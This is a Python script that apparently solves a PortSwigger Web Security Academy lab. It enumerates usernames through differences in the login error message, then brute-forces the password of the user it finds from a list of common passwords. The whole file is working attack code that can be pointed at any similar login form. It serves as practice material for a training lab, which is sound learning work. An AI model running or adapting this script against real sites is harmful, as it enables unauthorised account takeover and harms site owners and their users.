import requests
import os
from bs4 import BeautifulSoup

url = 'https://0ae800830496f21f806fe40a00930053.web-security-academy.net/login'

userlist = ['carlos','root','admin','test','guest','info','adm','mysql','user','administrator','oracle','ftp','pi','puppet','ansible','ec2-user','vagrant','azureuser','academico','acceso','access','accounting','accounts','acid','activestat','ad','adam','adkit','admin','administracion','administrador','administrator','administrators','admins','ads','adserver','adsl','ae','af','affiliate','affiliates','afiliados','ag','agenda','agent','ai','aix','ajax','ak','akamai','al','alabama','alaska','albuquerque','alerts','alpha','alterwind','am','amarillo','americas','an','anaheim','analyzer','announce','announcements','antivirus','ao','ap','apache','apollo','app','app01','app1','apple','application','applications','apps','appserver','aq','ar','archie','arcsight','argentina','arizona','arkansas','arlington','as','as400','asia','asterix','at','athena','atlanta','atlas','att','au','auction','austin','auth','auto','autodiscover']
passwords = ['123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321','superman','1qaz2wsx','7777777','121212','000000','qazwsx','123qwe','killer','trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster','soccer','harley','batman','andrew','tigger','sunshine','iloveyou','2000','charlie','robert','thomas','hockey','ranger','daniel','starwars','klaster','112233','george','computer','michelle','jessica','pepper','1111','zxcvbn','555555','11111111','131313','freedom','777777','pass','maggie','159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','nicole','chelsea','biteme','matthew','access','yankees','987654321','dallas','austin','thunder','taylor','matrix','mobilemail','mom','monitor','monitoring','montana','moon','moscow']

def test_if_user_exists(user):
    data = { 'username': user, 'password': 'BLAAAA' }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r = requests.post(url, data=data, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    responso = soup.find('p', class_='is-warning').text.strip()
    if 'Invalid username or password.' in r.text:
        line_new = '{:<20}  {:<20}'.format(user, responso)
        print(line_new)
    else:
        global userok
        userok = user
        return True
    

def test_if_password_correct(password):
    data = { 'username': userok, 'password': password }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r = requests.post(url, data=data, headers=headers)
    if 'Invalid username or password' in r.text:
        line_new = '{:<20}  {:<20}'.format(password, "Invalid password")
        print(line_new)
    else:
        global passok
        passok = password
        return True

print("Testing users...\n")
for i in range(len(userlist)):
    if test_if_user_exists(userlist[i]) == True:
        break
print("[+] Correct user found! " + userok + "\n")

print("Testing passwords...\n")

for i in range(len(passwords)):
    if test_if_password_correct(passwords[i]) == True:
        break

print("Correct password is: " + passok)



